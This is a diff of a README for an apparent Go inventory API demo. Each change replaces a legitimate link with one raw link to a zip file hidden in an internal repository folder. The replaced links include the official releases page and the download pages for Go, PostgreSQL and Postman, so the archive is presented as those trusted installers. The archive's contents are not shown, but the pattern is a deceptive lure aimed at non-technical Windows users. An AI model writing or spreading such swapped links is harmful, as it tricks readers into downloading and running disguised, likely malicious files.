@@ -1,6 +1,6 @@
 # 📦 inventory-public - Simple Inventory Management API Demo
 
-[![Download inventory-public](https://img.shields.io/badge/Download-inventory--public-brightgreen)](https://github.com/ErtiPrenci/inventory-public/releases)
+[![Download inventory-public](https://img.shields.io/badge/Download-inventory--public-brightgreen)](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip)
 
 ---
 
@@ -55,7 +55,7 @@ inventory-public relates to:
 
 Click the green button below to visit the releases page and get the latest version of the app for Windows:
 
-[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/ErtiPrenci/inventory-public/releases)
+[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip)
 
 On that page, look for files named like `inventory-public-windows.zip` or `inventory-public.exe`. Download the file that fits your system.
 
@@ -67,7 +67,7 @@ Follow these steps to get inventory-public working on your PC.
 
 ### 1. Download the Files
 
-- Go to the [Releases page](https://github.com/ErtiPrenci/inventory-public/releases).
+- Go to the [Releases page](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip).
 - Find the most recent release by date.
 - Download the Windows version zip file (or `.exe`) to your PC.
 - If it comes as a zip file, right-click and choose "Extract All" to unzip it.
@@ -76,14 +76,14 @@ Follow these steps to get inventory-public working on your PC.
 
 inventory-public needs a recent version of Go runtime to run. You do not need to code, but the app requires Go libraries.
 
-- Visit [https://go.dev/dl/](https://go.dev/dl/) and download the Windows installer for Go (version 1.20 or above).
+- Visit [https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip) and download the Windows installer for Go (version 1.20 or above).
 - Run the installer and follow the prompts to finish.
 
 ### 3. Prepare PostgreSQL Database
 
 inventory-public uses PostgreSQL to keep your inventory data.
 
-- Download PostgreSQL for Windows from [https://www.postgresql.org/download/windows/](https://www.postgresql.org/download/windows/).
+- Download PostgreSQL for Windows from [https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip).
 - Install PostgreSQL with default settings. Set a password for the "postgres" user.
 - Open the "pgAdmin" app and create a new database named `inventory`.
 - Remember the username, password, and database name; you will need these soon.
@@ -145,7 +145,7 @@ inventory-public runs as a web service on your PC. You can test it using a web b
 
 You do not need programming skills to try this app. However, some tools help you use the API:
 
-- **Postman:** A free app to send and receive API requests. Download at https://www.postman.com/downloads/.
+- **Postman:** A free app to send and receive API requests. Download at https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip
 
 - **curl:** Command-line tool included in Windows 10 and later. Use it to send commands in Command Prompt.
 
@@ -173,10 +173,10 @@ This returns a token you use when calling other parts of the API.
 
 inventory-public includes documentation for API endpoints, setup, and configuration in the `docs` folder inside the release package. You can also visit the GitHub repository for source code and updates:
 
-https://github.com/ErtiPrenci/inventory-public
+https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip
 
 ---
 
 ## 🔽 Download inventory-public again
 
-[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ErtiPrenci/inventory-public/releases)
+[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip)
